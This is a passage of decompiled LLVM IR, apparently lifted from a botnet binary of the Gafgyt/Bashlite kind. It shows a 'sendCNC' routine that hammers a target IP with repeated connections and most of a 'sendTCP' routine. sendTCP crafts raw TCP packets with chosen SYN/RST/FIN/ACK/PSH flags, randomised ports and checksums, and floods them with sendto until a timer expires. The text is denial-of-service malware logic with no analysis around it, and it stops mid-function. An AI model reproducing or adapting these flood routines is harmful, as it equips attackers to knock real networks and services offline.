  uselistorder i32 %v3_102c4, { 1, 0 }
  uselistorder i32 %v3_10250, { 8, 6, 4, 7, 5, 2, 3, 13, 12, 11, 10, 9, 1, 0 }
  uselistorder i32 %v1_10220, { 1, 0 }
  uselistorder i32 %v1_101d8, { 1, 0 }
  uselistorder i32 %v1_100f8, { 1, 0 }
  uselistorder i32 %v3_10070, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v2_10060, { 1, 0, 2 }
  uselistorder i32 %v3_ff64, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 5, 6, 3, 4, 10, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 20, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 33, 36, 38, 37, 39, 40, 44, 41, 42, 43, 70, 45, 47, 46, 48, 49, 51, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 65, 67, 68, 69, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_10540, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10464, { 1, 0 }
  uselistorder label %dec_label_pc_10344, { 1, 0 }
  uselistorder label %dec_label_pc_1021c, { 1, 0 }
  uselistorder label %dec_label_pc_101a0, { 1, 0 }
  uselistorder label %dec_label_pc_100d0, { 1, 0 }
  uselistorder label %dec_label_pc_ff80, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10574 = call i32 @time(i32* null)
  %v2_10580 = add i32 %v2_10574, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_10590 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_105b4 = urem i32 %arg2, 65536
  %v1_105bc = call i32 @__GI_htons(i32 %v3_105b4)
  %v3_105fc = bitcast i32* %stack_var_-40 to %sockaddr*
  br label %dec_label_pc_10610

dec_label_pc_105d4:                               ; preds = %dec_label_pc_10610
  %v0_105e0 = call i32 @socket()
  %v4_105fc = call i32 @__libc_connect(i32 %v0_105e0, %sockaddr* %v3_105fc, i32 16)
  %v1_10604 = call i32 @sleep(i32 1)
  %v1_1060c = call i32 @__GI_close(i32 %v0_105e0)
  br label %dec_label_pc_10610

dec_label_pc_10610:                               ; preds = %entry, %dec_label_pc_105d4
  %v2_10614 = call i32 @time(i32* null)
  %v5_10624 = icmp slt i32 %v2_10614, %v2_10580
  br i1 %v5_10624, label %dec_label_pc_105d4, label %dec_label_pc_10628

dec_label_pc_10628:                               ; preds = %dec_label_pc_10610
  ret i32 %v2_10614

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10610, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_10634 = load i32, i32* @r4, align 4
  %v6_10634 = load i32, i32* @fp, align 4
  store i32 67132, i32* %stack_var_-4, align 4
  %v2_10638 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10638, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_10674 = icmp eq i32 %arg2, 0
  br i1 %v2_10674, label %dec_label_pc_1067c, label %dec_label_pc_1069c

dec_label_pc_1067c:                               ; preds = %entry
  %v0_1067c = call i32 @rand_cmwc()
  %v3_10684 = mul i32 %v0_1067c, 65536
  store i32 %v3_10684, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_106c0

dec_label_pc_1069c:                               ; preds = %entry
  %v3_106a4 = urem i32 %arg2, 65536
  store i32 %v3_106a4, i32* %r3.global-to-local, align 4
  %v1_106ac = call i32 @__GI_htons(i32 %v3_106a4)
  br label %dec_label_pc_106c0

dec_label_pc_106c0:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_1069c
  %v2_106c4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_106c4, i32* %r3.global-to-local, align 4
  %v3_106d0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_106d0, i32* %r3.global-to-local, align 4
  %v2_106d8 = icmp eq i32 %v3_106d0, 0
  br i1 %v2_106d8, label %dec_label_pc_106e4, label %dec_label_pc_10d80

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106c0
  %v2_106e8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_106e8, i32* %r3.global-to-local, align 4
  store i32 8, i32* @r2, align 4
  %v2_106f8 = bitcast i32* %stack_var_-56 to i8*
  %v3_106f8 = call i32 @__GI_memset(i8* %v2_106f8, i32 0)
  store i32 6, i32* @r2, align 4
  %v0_10708 = call i32 @socket()
  store i32 %v0_10708, i32* %r3.global-to-local, align 4
  %v2_10718 = icmp eq i32 %v0_10708, 0
  br i1 %v2_10718, label %dec_label_pc_10720, label %dec_label_pc_10738

dec_label_pc_10720:                               ; preds = %dec_label_pc_106e4
  %v2_10724 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_10724, i32* %r3.global-to-local, align 4
  %v3_10730 = call i32 @HackerPrint(i32 %v2_10724, i32 ptrtoint ([27 x i8]* @global_var_23dfc.1175 to i32))
  br label %dec_label_pc_10d80

dec_label_pc_10738:                               ; preds = %dec_label_pc_106e4
  store i32 1, i32* %stack_var_-68, align 4
  %v2_10740 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_10740, i32* %r3.global-to-local, align 4
  %v6_1075c = call i32 @__GI_setsockopt(i32 %v0_10708, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_1075c, i32* %r3.global-to-local, align 4
  %v1_10764 = icmp slt i32 %v6_1075c, 0
  br i1 %v1_10764, label %dec_label_pc_1076c, label %dec_label_pc_10784

dec_label_pc_1076c:                               ; preds = %dec_label_pc_10738
  %v2_10770 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_10770, i32* %r3.global-to-local, align 4
  %v3_1077c = call i32 @HackerPrint(i32 %v2_10770, i32 ptrtoint ([33 x i8]* @global_var_23e18.1177 to i32))
  br label %dec_label_pc_10d80

dec_label_pc_10784:                               ; preds = %dec_label_pc_10738
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_10788 = icmp eq i32 %arg4, 0
  br i1 %v2_10788, label %dec_label_pc_107b4, label %dec_label_pc_1079c

dec_label_pc_1079c:                               ; preds = %dec_label_pc_10784
  %v1_107a0 = sub i32 32, %arg4
  store i32 %v1_107a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_107ac = shl i32 -1, %v1_107a0
  br label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %dec_label_pc_10784, %dec_label_pc_1079c
  %storemerge10 = phi i32 [ %v1_107ac, %dec_label_pc_1079c ], [ 0, %dec_label_pc_10784 ]
  %v1_107b8 = add i32 %arg6, 40
  %v1_107c8 = add i32 %arg6, 46
  %v3_107cc = and i32 %v1_107c8, -4
  %v1_107d4 = load i32, i32* @sp, align 4
  %v2_107d4 = sub i32 %v1_107d4, %v3_107cc
  %v1_107e4 = add i32 %v2_107d4, 11
  %v3_107e8 = and i32 %v1_107e4, -4
  store i32 %v3_107e8, i32* %r2.global-to-local, align 4
  %v1_10808 = add i32 %v3_107e8, 20
  store i32 %v1_10808, i32* %r3.global-to-local, align 4
  %v5_1080c = inttoptr i32 %v1_10808 to i8*
  %v3_10810 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10810, i32* @r4, align 4
  %v1_10818 = call i32 @HackerScan2(i32 %storemerge10)
  store i32 %v1_10818, i32* %r3.global-to-local, align 4
  store i32 %v1_10818, i32* @r0, align 4
  %v1_10824 = call i32 @__GI_htonl(i32 %v1_10818)
  store i32 %v1_10824, i32* %r2.global-to-local, align 4
  %v1_10830 = add i32 %arg6, 20
  %v1_10834 = load i32, i32* @sp, align 4
  %v2_10834 = inttoptr i32 %v1_10834 to i32*
  store i32 %v1_10830, i32* %v2_10834, align 4
  %v0_1083c = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_10844 = inttoptr i32 %v3_107e8 to i8*
  %v5_10844 = call i32 @makeIPPacket(i8* %v4_10844, i32 %v0_1083c, i32 %v1_10824, i32 6)
  %v0_10848 = call i32 @rand_cmwc()
  %v3_10854 = urem i32 %v0_10848, 65536
  store i32 %v3_10854, i32* %r3.global-to-local, align 4
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v1_1085c = trunc i32 %v0_10848 to i8
  store i8 %v1_1085c, i8* %v5_1080c, align 4
  %v0_10860 = load i32, i32* %r3.global-to-local, align 4
  %v3_10860 = sdiv i32 %v0_10860, 256
  store i32 %v3_10860, i32* %r3.global-to-local, align 4
  %v1_10864 = trunc i32 %v3_10860 to i8
  %v2_10864 = load i32, i32* %r2.global-to-local, align 4
  %v3_10864 = add i32 %v2_10864, 1
  %v4_10864 = inttoptr i32 %v3_10864 to i8*
  store i8 %v1_10864, i8* %v4_10864, align 1
  %v0_10868 = call i32 @rand_cmwc()
  %v2_10874 = add i32 %v3_107e8, 24
  %v3_10874 = inttoptr i32 %v2_10874 to i32*
  store i32 %v0_10868, i32* %v3_10874, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10880 = add i32 %v3_107e8, 28
  %v3_10880 = inttoptr i32 %v2_10880 to i32*
  store i32 0, i32* %v3_10880, align 4
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v1_10888 = add i32 %v3_107e8, 32
  %v2_10888 = inttoptr i32 %v1_10888 to i8*
  %v3_10888 = load i8, i8* %v2_10888, align 4
  %v1_10894 = urem i8 %v3_10888, 16
  %v1_10898 = or i8 %v1_10894, 80
  store i8 %v1_10898, i8* %v2_10888, align 4
  %v3_108a8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_108a8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23e3c.1182 to i32), i32* @r1, align 4
  %v3_108b4 = inttoptr i32 %v3_108a8 to i8*
  %v4_108b4 = call i32 @__GI_strcoll(i8* %v3_108b4, i32 ptrtoint ([4 x i8]* @global_var_23e3c.1182 to i32))
  store i32 %v4_108b4, i32* %r3.global-to-local, align 4
  %v2_108bc = icmp eq i32 %v4_108b4, 0
  br i1 %v2_108bc, label %dec_label_pc_108c4, label %dec_label_pc_1097c

dec_label_pc_108c4:                               ; preds = %dec_label_pc_107b4
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v1_108c8 = add i32 %v3_107e8, 33
  %v2_108c8 = inttoptr i32 %v1_108c8 to i8*
  %v3_108c8 = load i8, i8* %v2_108c8, align 1
  %v4_108d0 = zext i8 %v3_108c8 to i32
  %v1_108d8 = or i32 %v4_108d0, 2
  store i32 %v1_108d8, i32* %r3.global-to-local, align 4
  %v1_108e4 = trunc i32 %v1_108d8 to i8
  store i8 %v1_108e4, i8* %v2_108c8, align 1
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v3_108ec = load i8, i8* %v2_108c8, align 1
  %v4_108f4 = zext i8 %v3_108ec to i32
  %v1_108fc = or i32 %v4_108f4, 4
  store i32 %v1_108fc, i32* %r3.global-to-local, align 4
  %v1_10908 = trunc i32 %v1_108fc to i8
  store i8 %v1_10908, i8* %v2_108c8, align 1
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v3_10910 = load i8, i8* %v2_108c8, align 1
  %v4_10918 = zext i8 %v3_10910 to i32
  %v1_10920 = or i32 %v4_10918, 1
  store i32 %v1_10920, i32* %r3.global-to-local, align 4
  %v1_1092c = trunc i32 %v1_10920 to i8
  store i8 %v1_1092c, i8* %v2_108c8, align 1
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v3_10934 = load i8, i8* %v2_108c8, align 1
  %v4_1093c = zext i8 %v3_10934 to i32
  %v1_10944 = or i32 %v4_1093c, 16
  store i32 %v1_10944, i32* %r3.global-to-local, align 4
  %v1_10950 = trunc i32 %v1_10944 to i8
  store i8 %v1_10950, i8* %v2_108c8, align 1
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v3_10958 = load i8, i8* %v2_108c8, align 1
  %v4_10960 = zext i8 %v3_10958 to i32
  %v1_10968 = or i32 %v4_10960, 8
  store i32 %v1_10968, i32* %r3.global-to-local, align 4
  %v1_10974 = trunc i32 %v1_10968 to i8
  store i8 %v1_10974, i8* %v2_108c8, align 1
  br label %dec_label_pc_10b24

dec_label_pc_1097c:                               ; preds = %dec_label_pc_107b4
  %v3_1097c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1097c, i32* %r3.global-to-local, align 4
  store i32 %v3_1097c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_10988 = call i32 @__GI_strtok(i32 %v3_1097c, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  store i32 %v2_10988, i32* %r3.global-to-local, align 4
  %v2_10b1c20 = icmp eq i32 %v2_10988, 0
  br i1 %v2_10b1c20, label %dec_label_pc_10b24, label %dec_label_pc_10998.lr.ph

dec_label_pc_10998.lr.ph:                         ; preds = %dec_label_pc_1097c
  %v1_109b8 = add i32 %v3_107e8, 33
  %v2_109b8 = inttoptr i32 %v1_109b8 to i8*
  br label %dec_label_pc_10998

dec_label_pc_10998:                               ; preds = %dec_label_pc_10998.lr.ph, %dec_label_pc_10b04
  %storemerge1421 = phi i32 [ %v2_10988, %dec_label_pc_10998.lr.ph ], [ %v2_10b0c, %dec_label_pc_10b04 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23e44.1186 to i32), i32* @r1, align 4
  %v3_109a4 = inttoptr i32 %storemerge1421 to i8*
  %v4_109a4 = call i32 @__GI_strcoll(i8* %v3_109a4, i32 ptrtoint ([4 x i8]* @global_var_23e44.1186 to i32))
  store i32 %v4_109a4, i32* %r3.global-to-local, align 4
  %v2_109ac = icmp eq i32 %v4_109a4, 0
  br i1 %v2_109ac, label %dec_label_pc_109b4, label %dec_label_pc_109dc

dec_label_pc_109b4:                               ; preds = %dec_label_pc_10998
  store i32 %v1_10808, i32* %r3.global-to-local, align 4
  %v3_109b8 = load i8, i8* %v2_109b8, align 1
  %v4_109c0 = zext i8 %v3_109b8 to i32
  %v1_109c8 = or i32 %v4_109c0, 2
  store i32 %v1_109c8, i32* %r2.global-to-local, align 4
  %v1_109d4 = trunc i32 %v1_109c8 to i8
  store i8 %v1_109d4, i8* %v2_109b8, align 1
  br label %dec_label_pc_10b04

dec_label_pc_109dc:                               ; preds = %dec_label_pc_10998
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23e48.1188 to i32), i32* @r1, align 4
  %v4_109e8 = call i32 @__GI_strcoll(i8* %v3_109a4, i32 ptrtoint ([4 x i8]* @global_var_23e48.1188 to i32))
  store i32 %v4_109e8, i32* %r3.global-to-local, align 4
  %v2_109f0 = icmp eq i32 %v4_109e8, 0
  br i1 %v2_109f0, label %dec_label_pc_109f8, label %dec_label_pc_10a20

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109dc
  store i32 %v1_10808, i32* %r3.global-to-local, align 4
  %v3_109fc = load i8, i8* %v2_109b8, align 1
  %v4_10a04 = zext i8 %v3_109fc to i32
  %v1_10a0c = or i32 %v4_10a04, 4
  store i32 %v1_10a0c, i32* %r2.global-to-local, align 4
  %v1_10a18 = trunc i32 %v1_10a0c to i8
  store i8 %v1_10a18, i8* %v2_109b8, align 1
  br label %dec_label_pc_10b04

dec_label_pc_10a20:                               ; preds = %dec_label_pc_109dc
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23e4c.1190 to i32), i32* @r1, align 4
  %v4_10a2c = call i32 @__GI_strcoll(i8* %v3_109a4, i32 ptrtoint ([4 x i8]* @global_var_23e4c.1190 to i32))
  store i32 %v4_10a2c, i32* %r3.global-to-local, align 4
  %v2_10a34 = icmp eq i32 %v4_10a2c, 0
  br i1 %v2_10a34, label %dec_label_pc_10a3c, label %dec_label_pc_10a64

dec_label_pc_10a3c:                               ; preds = %dec_label_pc_10a20
  store i32 %v1_10808, i32* %r3.global-to-local, align 4
  %v3_10a40 = load i8, i8* %v2_109b8, align 1
  %v4_10a48 = zext i8 %v3_10a40 to i32
  %v1_10a50 = or i32 %v4_10a48, 1
  store i32 %v1_10a50, i32* %r2.global-to-local, align 4
  %v1_10a5c = trunc i32 %v1_10a50 to i8
  store i8 %v1_10a5c, i8* %v2_109b8, align 1
  br label %dec_label_pc_10b04

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a20
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23e50.1192 to i32), i32* @r1, align 4
  %v4_10a70 = call i32 @__GI_strcoll(i8* %v3_109a4, i32 ptrtoint ([4 x i8]* @global_var_23e50.1192 to i32))
  store i32 %v4_10a70, i32* %r3.global-to-local, align 4
  %v2_10a78 = icmp eq i32 %v4_10a70, 0
  br i1 %v2_10a78, label %dec_label_pc_10a80, label %dec_label_pc_10aa8

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a64
  store i32 %v1_10808, i32* %r3.global-to-local, align 4
  %v3_10a84 = load i8, i8* %v2_109b8, align 1
  %v4_10a8c = zext i8 %v3_10a84 to i32
  %v1_10a94 = or i32 %v4_10a8c, 16
  store i32 %v1_10a94, i32* %r2.global-to-local, align 4
  %v1_10aa0 = trunc i32 %v1_10a94 to i8
  store i8 %v1_10aa0, i8* %v2_109b8, align 1
  br label %dec_label_pc_10b04

dec_label_pc_10aa8:                               ; preds = %dec_label_pc_10a64
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23e54.1194 to i32), i32* @r1, align 4
  %v4_10ab4 = call i32 @__GI_strcoll(i8* %v3_109a4, i32 ptrtoint ([4 x i8]* @global_var_23e54.1194 to i32))
  store i32 %v4_10ab4, i32* %r3.global-to-local, align 4
  %v2_10abc = icmp eq i32 %v4_10ab4, 0
  br i1 %v2_10abc, label %dec_label_pc_10ac4, label %dec_label_pc_10aec

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10aa8
  store i32 %v1_10808, i32* %r3.global-to-local, align 4
  %v3_10ac8 = load i8, i8* %v2_109b8, align 1
  %v4_10ad0 = zext i8 %v3_10ac8 to i32
  %v1_10ad8 = or i32 %v4_10ad0, 8
  store i32 %v1_10ad8, i32* %r2.global-to-local, align 4
  %v1_10ae4 = trunc i32 %v1_10ad8 to i8
  store i8 %v1_10ae4, i8* %v2_109b8, align 1
  br label %dec_label_pc_10b04

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10aa8
  %v2_10af0 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_10af0, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_10b00 = call i32 @HackerPrint(i32 %v2_10af0, i32 ptrtoint ([18 x i8]* @global_var_23e58.1196 to i32))
  br label %dec_label_pc_10b04

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10ac4, %dec_label_pc_10a80, %dec_label_pc_10a3c, %dec_label_pc_109f8, %dec_label_pc_109b4, %dec_label_pc_10aec
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_10b0c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  store i32 %v2_10b0c, i32* %r3.global-to-local, align 4
  %v2_10b1c = icmp eq i32 %v2_10b0c, 0
  br i1 %v2_10b1c, label %dec_label_pc_10b24, label %dec_label_pc_10998

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b04, %dec_label_pc_1097c, %dec_label_pc_108c4
  %v0_10b24 = call i32 @rand_cmwc()
  %v3_10b30 = urem i32 %v0_10b24, 65536
  store i32 %v3_10b30, i32* %r3.global-to-local, align 4
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v1_10b38 = trunc i32 %v0_10b24 to i8
  %v3_10b38 = add i32 %v3_107e8, 34
  %v4_10b38 = inttoptr i32 %v3_10b38 to i8*
  store i8 %v1_10b38, i8* %v4_10b38, align 2
  %v0_10b3c = load i32, i32* %r3.global-to-local, align 4
  %v3_10b3c25 = udiv i32 %v0_10b3c, 256
  %v1_10b40 = trunc i32 %v3_10b3c25 to i8
  %v2_10b40 = load i32, i32* %r2.global-to-local, align 4
  %v3_10b40 = add i32 %v2_10b40, 15
  %v4_10b40 = inttoptr i32 %v3_10b40 to i8*
  store i8 %v1_10b40, i8* %v4_10b40, align 1
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10b4c = add i32 %v3_107e8, 36
  %v4_10b4c = inttoptr i32 %v3_10b4c to i8*
  store i8 0, i8* %v4_10b4c, align 4
  %v0_10b50 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b50 = trunc i32 %v0_10b50 to i8
  %v2_10b50 = load i32, i32* %r2.global-to-local, align 4
  %v3_10b50 = add i32 %v2_10b50, 17
  %v4_10b50 = inttoptr i32 %v3_10b50 to i8*
  store i8 %v1_10b50, i8* %v4_10b50, align 1
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10b5c = add i32 %v3_107e8, 38
  %v4_10b5c = inttoptr i32 %v3_10b5c to i8*
  store i8 0, i8* %v4_10b5c, align 2
  %v0_10b60 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b60 = trunc i32 %v0_10b60 to i8
  %v2_10b60 = load i32, i32* %r2.global-to-local, align 4
  %v3_10b60 = add i32 %v2_10b60, 19
  %v4_10b60 = inttoptr i32 %v3_10b60 to i8*
  store i8 %v1_10b60, i8* %v4_10b60, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_10674, label %dec_label_pc_10b70, label %dec_label_pc_10b88

dec_label_pc_10b70:                               ; preds = %dec_label_pc_10b24
  %v0_10b70 = call i32 @rand_cmwc()
  %v3_10b78 = mul i32 %v0_10b70, 65536
  store i32 %v3_10b78, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_10b70 to i8
  br label %dec_label_pc_10ba4

dec_label_pc_10b88:                               ; preds = %dec_label_pc_10b24
  %v3_10b90 = urem i32 %arg2, 65536
  store i32 %v3_10b90, i32* %r3.global-to-local, align 4
  %v1_10b98 = call i32 @__GI_htons(i32 %v3_10b90)
  %extract.t80 = trunc i32 %v1_10b98 to i8
  br label %dec_label_pc_10ba4

dec_label_pc_10ba4:                               ; preds = %dec_label_pc_10b70, %dec_label_pc_10b88
  %v0_10b70.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_10b70 ], [ %extract.t80, %dec_label_pc_10b88 ]
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v4_10ba8 = sext i8 %v0_10b70.sink.off0 to i32
  %v3_10bac = add i32 %v3_107e8, 22
  %v4_10bac = inttoptr i32 %v3_10bac to i8*
  store i8 %v0_10b70.sink.off0, i8* %v4_10bac, align 2
  %v3_10bb4 = sdiv i32 %v4_10ba8, 256
  %v4_10bb4 = trunc i32 %v3_10bb4 to i8
  store i32 %v3_10bb4, i32* %r3.global-to-local, align 4
  %v4_10bb8 = add i32 %v3_107e8, 23
  %v5_10bb8 = inttoptr i32 %v4_10bb8 to i8*
  store i8 %v4_10bb4, i8* %v5_10bb8, align 1
  %v5_10bc4 = call i32 @tcpcsum(i32 %v3_107e8, i32 %v1_10808, i32 %v1_10808, i32 %v3_10bb4)
  %sext = mul i32 %v5_10bc4, 16777216
  %v1_10bc8 = sdiv i32 %sext, 16777216
  store i32 %v1_10bc8, i32* %r3.global-to-local, align 4
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v1_10bd0 = trunc i32 %v1_10bc8 to i8
  store i8 %v1_10bd0, i8* %v4_10b4c, align 4
  %v0_10bd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_10bd428 = udiv i32 %v0_10bd4, 256
  %v1_10bd8 = trunc i32 %v3_10bd428 to i8
  %v2_10bd8 = load i32, i32* %r2.global-to-local, align 4
  %v3_10bd8 = add i32 %v2_10bd8, 17
  %v4_10bd8 = inttoptr i32 %v3_10bd8 to i8*
  store i8 %v1_10bd8, i8* %v4_10bd8, align 1
  %v1_10be8 = or i32 %v3_107e8, 2
  store i32 %v1_10be8, i32* %r3.global-to-local, align 4
  %v1_10bec = inttoptr i32 %v1_10be8 to i8*
  %v2_10bec = load i8, i8* %v1_10bec, align 2
  %v3_10bec = zext i8 %v2_10bec to i32
  store i32 %v3_10bec, i32* %r2.global-to-local, align 4
  %v1_10bf0 = or i32 %v1_107e4, 3
  %v2_10bf0 = inttoptr i32 %v1_10bf0 to i8*
  %v3_10bf0 = load i8, i8* %v2_10bf0, align 1
  %v4_10bf0 = zext i8 %v3_10bf0 to i32
  %v4_10bf4 = mul nuw nsw i32 %v4_10bf0, 256
  %v5_10bf4 = or i32 %v4_10bf4, %v3_10bec
  store i32 %v5_10bf4, i32* %r3.global-to-local, align 4
  %v3_10c00 = call i32 @csum(i8* %v4_10844, i32 %v5_10bf4)
  %sext4 = mul i32 %v3_10c00, 16777216
  %v1_10c04 = sdiv i32 %sext4, 16777216
  store i32 %v1_10c04, i32* %r3.global-to-local, align 4
  store i32 %v3_107e8, i32* %r2.global-to-local, align 4
  %v1_10c0c = trunc i32 %v1_10c04 to i8
  %v3_10c0c = add i32 %v3_107e8, 10
  %v4_10c0c = inttoptr i32 %v3_10c0c to i8*
  store i8 %v1_10c0c, i8* %v4_10c0c, align 2
  %v0_10c10 = load i32, i32* %r3.global-to-local, align 4
  %v3_10c10 = sdiv i32 %v0_10c10, 256
  store i32 %v3_10c10, i32* %r3.global-to-local, align 4
  %v1_10c14 = trunc i32 %v3_10c10 to i8
  %v2_10c14 = load i32, i32* %r2.global-to-local, align 4
  %v3_10c14 = add i32 %v2_10c14, 11
  %v4_10c14 = inttoptr i32 %v3_10c14 to i8*
  store i8 %v1_10c14, i8* %v4_10c14, align 1
  %v2_10c1c = call i32 @time(i32* null)
  %v2_10c28 = add i32 %v2_10c1c, %arg3
  store i32 %v2_10c28, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10c3c = ptrtoint i32* %stack_var_-64 to i32
  %v2_10c7c = add i32 %v3_107e8, 12
  %v3_10c7c = inttoptr i32 %v2_10c7c to i32*
  %v3_10c94 = add i32 %v3_107e8, 4
  %v4_10c94 = inttoptr i32 %v3_10c94 to i8*
  %v4_10cdc = add i32 %v3_107e8, 37
  %v5_10cdc = inttoptr i32 %v4_10cdc to i8*
  br label %dec_label_pc_10c38

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10d70, %dec_label_pc_10d64, %dec_label_pc_10ba4
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10ba4 ], [ 0, %dec_label_pc_10d64 ], [ %v1_10d74, %dec_label_pc_10d70 ]
  store i32 %v3_107e8, i32* %r2.global-to-local, align 4
  %v1_10c40 = load i32, i32* @sp, align 4
  %v2_10c40 = inttoptr i32 %v1_10c40 to i32*
  store i32 %v2_10c3c, i32* %v2_10c40, align 4
  %v1_10c48 = load i32, i32* @sp, align 4
  %v2_10c48 = add i32 %v1_10c48, 4
  %v3_10c48 = inttoptr i32 %v2_10c48 to i32*
  store i32 16, i32* %v3_10c48, align 4
  %v0_10c50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_107b8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_10c5c = inttoptr i32 %v0_10c50 to i32*
  %v7_10c5c = call i32 @__libc_sendto(i32 %v0_10708, i32* %v6_10c5c, i32 %v1_107b8, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
